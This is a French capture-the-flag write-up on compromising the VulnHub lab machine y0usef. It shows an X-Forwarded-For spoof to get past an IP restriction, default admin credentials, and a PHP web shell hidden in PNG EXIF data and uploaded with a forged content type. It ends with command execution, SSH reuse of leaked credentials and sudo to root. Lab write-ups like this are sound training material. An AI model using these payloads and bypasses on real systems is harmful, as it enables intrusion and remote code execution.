---
title: Solution du CTF y0usef de VulnHub
tags: [CTF, VulnHub]
---

### There's no place like 127.0.0.1

Le CTF [y0usef](https://vulnhub.com/entry/y0usef-1,624/) de VulnHub est le genre de CTF qui mise tout sur la première partie, délaissant l'escalade de privilèges. Pas trop grave, la première partie a de quoi nous occuper un peu.

On commence comme souvent avec deux ports ouverts : 22 et 80.

Une énumération avec un premier dictionnaire remonte un dossier `adminstration` avec une typo. Ça a son importance, car ça m'a fait perdre pas mal de temps (comme quoi le copier/coller, c'est vachement bien).

```console
$ feroxbuster -u http://192.168.56.112/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.112/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      302c http://192.168.56.112/server-status
200       15l       36w      791c http://192.168.56.112/
301        9l       28w      324c http://192.168.56.112/adminstration
[####################] - 8s     62260/62260   0s      found:3       errors:0      
[####################] - 7s     62260/62260   8270/s  http://192.168.56.112/
```

Pour trouver d'autres éléments, j'ai utilisé une autre wordlist. C'est en général bon d'avoir ces deux là.

```console
$ feroxbuster -u http://192.168.56.112/adminstration/ -w DirBuster-0.12/directory-list-2.3-big.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.112/adminstration/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      330c http://192.168.56.112/adminstration/users
301        9l       28w      331c http://192.168.56.112/adminstration/upload
301        9l       28w      332c http://192.168.56.112/adminstration/include
301        9l       28w      331c http://192.168.56.112/adminstration/logout
301        9l       28w      334c http://192.168.56.112/adminstration/bootstrap
[####################] - 3m   1273562/1273562 0s      found:5       errors:1      
[####################] - 3m   1273562/1273562 7070/s  http://192.168.56.112/adminstration/
```

Toutes ces URLs redirigent en 301 vers le dossier correspondant (redirection avec le `/` terminal) mais une fois accédé, on obtient un 403 (accès refusé).

Après avoir énuméré en long et en large le serveur web, [une idée me vient](https://www.youtube.com/watch?v=D29OtboQV_c) :

```console
$ curl -D- http://192.168.56.112/adminstration/
HTTP/1.0 403 Forbidden
Date: Thu, 26 Jun 2025 13:52:45 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=i1jooubj3epicm50h1vkb37mr0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 75
Connection: close
Content-Type: text/html

<h1>Forbidden</h1><p>You don't have permission to access on this folder</p>

$ curl -D- http://192.168.56.112/adminstration/ -H "X-Forwarded-For: 127.0.0.1"
HTTP/1.1 200 OK
Date: Thu, 26 Jun 2025 13:52:57 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=m6ejjj7eim76uk35orojdaoh35; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 926
Content-Type: text/html

<html>
<head>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
<body>
<form action="" method="POST">
 
 <div class="container mt-5">
    <div class="form-group">
        <label for="exampleInputUsername">Username</label>
        <input type="text" class="form-control" name="username" placeholder="Enter username">
        <small id="emailHelp" class="form-text text-muted">We'll never share your username with anyone else.</small>
    </div>
    <div class="form-group">
        <label for="exampleInputPassword">Password</label>
        <input type="password" class="form-control" name="password" placeholder="Password">
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
 </div>

</form>
</body>
</head>
</html>
```

Bingo ! En spécifiant le header `X-Forwarded-For` je fais croire que je viens de la machine locale et passe la restriction.

Pour la suite, j'aurais pu utiliser ZAP, mitmproxy ou encore un plugin de navigateur pour ajouter l'entête sur chaque requête HTTP, mais j'ai préféré tout faire via `curl`.

J'ai par exemple testé les identifiants `admin` / `admin` qui se sont avérés être valides :

```console
$ curl -D- -XPOST http://192.168.56.112/adminstration/ -H "X-Forwarded-For: 127.0.0.1" --data "username=admin&password=admin"
HTTP/1.1 302 Found
Date: Thu, 26 Jun 2025 13:58:07 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=8gklhf94h9uidgfpb2q97uncu2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: dashborad
Content-Length: 953
Content-Type: text/html

Hello admin welcome back !!<html>
<head>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
<body>
<form action="" method="POST">
 
 <div class="container mt-5">
    <div class="form-group">
        <label for="exampleInputUsername">Username</label>
        <input type="text" class="form-control" name="username" placeholder="Enter username">
        <small id="emailHelp" class="form-text text-muted">We'll never share your username with anyone else.</small>
    </div>
    <div class="form-group">
        <label for="exampleInputPassword">Password</label>
        <input type="password" class="form-control" name="password" placeholder="Password">
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
 </div>

</form>
</body>
</head>
</html>
```

Puis, je me suis dirigé vers la page d'upload, en prenant soit le passer le cookie obtenu :

```console
$ curl -D- http://192.168.56.112/adminstration/upload/ -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: PHPSESSID=8gklhf94h9uidgfpb2q97uncu2;"
HTTP/1.1 200 OK
Date: Thu, 26 Jun 2025 14:00:08 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2993
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
--- snip ---
<div class="container-fluid mt-5">
      <h1 class="mt-4">Upload File</h1>
       <form action="" method="post" enctype="multipart/form-data">
              <div class="form-group ml-5 mt-5">
                <label for="document"> Your document</label>
                <input type="file" name="document"> </br>
                <input type="submit" name="submit" value="Send" class="btn btn-primary">       
          </div>
         
        </form>
     </div>
    <!-- /#page-content-wrapper -->
 </div>

  </body>
```

Bien sûr, je m'attendais à quelques vérifications sur le fichier uploadé ; c'était le cas :

```console
$ curl -D- http://192.168.56.112/adminstration/upload/ -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: PHPSESSID=8gklhf94h9uidgfpb2q97uncu2;" -X POST -F "document=@/tmp/shell.php" -F "submit=Send"
HTTP/1.1 200 OK
Date: Thu, 26 Jun 2025 14:04:10 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3007
Content-Type: text/html

file not allow
```

J'ai testé différentes extensions comme `php3`, `phps`, `phtml` ou même `xxx`. Tout était refusé. Par conséquence soit il y a une whitelist d'extensions, soit ça fonctionne par déclaration mime (`content-type`).

J'ai essayé avec un fichier valide et son extension d'origine :

```console
$ curl -D- http://192.168.56.112/adminstration/upload/ -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: PHPSESSID=8gklhf94h9uidgfpb2q97uncu2;" -X POST -F "document=@/tmp/error.png" -F "submit=Send"
HTTP/1.1 200 OK
Date: Thu, 26 Jun 2025 14:14:10 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3032
Content-Type: text/html

file uploadad files/1750947250error.png
```

Mais si je renomme l'image en `.php`, étrangement, c'est refusé...

Bizarre. J'ai créé une image PNG valide de 1x1 pixel et apposé un shell PHP via les tags exif :

```console
$ magick -size 1x1 xc:white 1x1.png
$ exiftool -Comment='<?php system($_GET["cmd"]); ?>' 1x1.png
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (fixed) - 1x1.png
    1 image files updated
$ mv 1x1.png 1x1.php
```

J'ai lancé l'upload avec curl et le fichier était refusé...

J'ai passé du temps à fouiller et j'ai finalement écrit un script Python qui teste les extensions valides :

```python
import sys

import requests

sess = requests.session()

with open(sys.argv[1], encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        ext = line.strip()[1:]

        response = sess.post(
            f"http://192.168.56.112/adminstration/upload/",
            files={
                "document": (f"yolo.{ext}", "hellothere", "image/png"),
                "submit": "Send"
            },
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "Cookie": "PHPSESSID=8gklhf94h9uidgfpb2q97uncu2;"
            }
        )
        if "file not allow" not in response.text:
            print(f"Extension {ext} seems allowed")
            print(response.text)
            exit()
```

Grosse surprise : tout passait !

Les explications se voient avec Wireshark, il s'avère que curl ne fait pas vraiment de mime sniffing, il doit se baser sur l'extension du fichier :

```http
POST /adminstration/upload/ HTTP/1.1
Host: 192.168.56.112
User-Agent: curl
Accept: */*
X-Forwarded-For: 127.0.0.1
Cookie: PHPSESSID=8gklhf94h9uidgfpb2q97uncu2;
Content-Length: 664
Content-Type: multipart/form-data; boundary=------------------------NYhRMJrgWYvw8DqKtNxb5V

--------------------------NYhRMJrgWYvw8DqKtNxb5V
Content-Disposition: form-data; name="document"; filename="1x1.php"
Content-Type: application/octet-stream

.PNG
.
...
IHDR.............7n.$... cHRM..z&..............u0...`..:....p..Q<....bKGD..........tIME......".\<1...%tEXtdate:create.2025-06-26T15:24:34+00:00...,...%tEXtdate:modify.2025-06-26T15:24:34+00:00.^.....(tEXtdate:timestamp.2025-06-26T15:24:34+00:00.K.O...&tEXtComment.<?php system($_GET["cmd"]); ?>...c...
IDAT..ch.......Cj.....IEND.B`.
--------------------------NYhRMJrgWYvw8DqKtNxb5V
Content-Disposition: form-data; name="submit"

Send
--------------------------NYhRMJrgWYvw8DqKtNxb5V--
```

Heureusement, on peut jouer avec le paramètre curl pour spécifier le bon content-type :

```console
$ curl -s -D- http://192.168.56.112/adminstration/upload/ -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: PHPSESSID=8gklhf94h9uidgfpb2q97uncu2;" -X POST -F 'document=@/tmp/1x1.php;type=image/png' -F "submit=Send"
HTTP/1.1 200 OK
Date: Thu, 26 Jun 2025 15:29:03 GMT
Server: Apache/2.4.10 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3030
Content-Type: text/html

file uploadad files/17509517431x1.php
```

Et ENFIN, j'ai mon exécution de commandes :

```console
$ curl -s "http://192.168.56.112/adminstration/upload/files/17509517431x1.php?cmd=id" -H "X-Forwarded-For: 127.0.0.1" --output - | strings
IHDR
 cHRM
bKGD
tIME
%tEXtdate:create
2025-06-26T15:24:34+00:00
%tEXtdate:modify
2025-06-26T15:24:34+00:00
(tEXtdate:timestamp
2025-06-26T15:24:34+00:00
&tEXtComment
uid=33(www-data) gid=33(www-data) groups=33(www-data)
IDAT
IEND
```

### Quickening

Une fois téléchargé un `reverse-sshx86` depuis la machine, tout va très vite :

```console
www-data@yousef-VirtualBox:/home$ ls
user.txt  yousef
www-data@yousef-VirtualBox:/home$ cat user.txt 
c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=
www-data@yousef-VirtualBox:/home$ cat user.txt | base64 -d
ssh : 
user : yousef 
pass : yousef123
```

Figurez-vous que ces identifiants fonctionnent en remote, ça aurait pu faire un bon kansas city shuffle.

La suite se passe de commentaires :

```console
$ ssh yousef@192.168.56.112
The authenticity of host '192.168.56.112 (192.168.56.112)' can't be established.
ED25519 key fingerprint is SHA256:J3OrMiuy5X+zdlTAYCltBBCNaN3bxTjPbQvtPR6QSzE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.112' (ED25519) to the list of known hosts.
yousef@192.168.56.112's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

778 packages can be updated.
482 updates are security updates.

Last login: Tue Dec  8 01:58:33 2020 from s
yousef@yousef-VirtualBox:~$ ls -al
total 124
drwxr-xr-x 18 yousef yousef 4096 Dec  8  2020 .
drwxr-xr-x  3 root   root   4096 Dec  6  2020 ..
-rw-------  1 yousef yousef 2896 Dec  8  2020 .ICEauthority
-rw-------  1 yousef yousef  186 Dec  8  2020 .Xauthority
-rw-------  1 yousef yousef 1340 Dec  8  2020 .bash_history
-rw-r--r--  1 yousef yousef  220 Nov 25  2020 .bash_logout
-rw-r--r--  1 yousef yousef 3637 Nov 25  2020 .bashrc
drwx------ 16 yousef yousef 4096 Dec  8  2020 .cache
drwx------  3 yousef yousef 4096 Dec  8  2020 .compiz
drwx------ 14 yousef yousef 4096 Nov 30  2020 .config
drwx------  3 root   root   4096 Dec  6  2020 .dbus
-rw-r--r--  1 yousef yousef   25 Nov 25  2020 .dmrc
drwx------  3 yousef yousef 4096 Dec  8  2020 .gconf
drwx------  2 root   root   4096 Dec  6  2020 .gvfs
drwxr-xr-x  3 yousef yousef 4096 Nov 25  2020 .local
drwx------  4 yousef yousef 4096 Nov 25  2020 .mozilla
-rw-r--r--  1 yousef yousef  675 Nov 25  2020 .profile
-rw-r-----  1 yousef yousef    5 Dec  8  2020 .vboxclient-clipboard.pid
-rw-r-----  1 yousef yousef    5 Dec  8  2020 .vboxclient-display.pid
-rw-r-----  1 yousef yousef    5 Dec  8  2020 .vboxclient-draganddrop.pid
-rw-r-----  1 yousef yousef    5 Dec  8  2020 .vboxclient-seamless.pid
-rw-------  1 yousef yousef  711 Dec  8  2020 .xsession-errors
-rw-------  1 yousef yousef  682 Dec  8  2020 .xsession-errors.old
drwxr-xr-x  2 yousef yousef 4096 Dec  7  2020 Desktop
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Documents
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Downloads
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Music
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Pictures
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Public
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Templates
drwxr-xr-x  2 yousef yousef 4096 Nov 25  2020 Videos
yousef@yousef-VirtualBox:~$ sudo -l
[sudo] password for yousef: 
Matching Defaults entries for yousef on yousef-VirtualBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User yousef may run the following commands on yousef-VirtualBox:
    (ALL : ALL) ALL
yousef@yousef-VirtualBox:~$ sudo su
root@yousef-VirtualBox:/home/yousef# cd /root/
root@yousef-VirtualBox:~# ls
root.txt
root@yousef-VirtualBox:~# cat root.txt 
WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx
root@yousef-VirtualBox:~# cat root.txt | base64 -d
You've got the root Congratulations any feedback content me twitter @y0usef_11
```
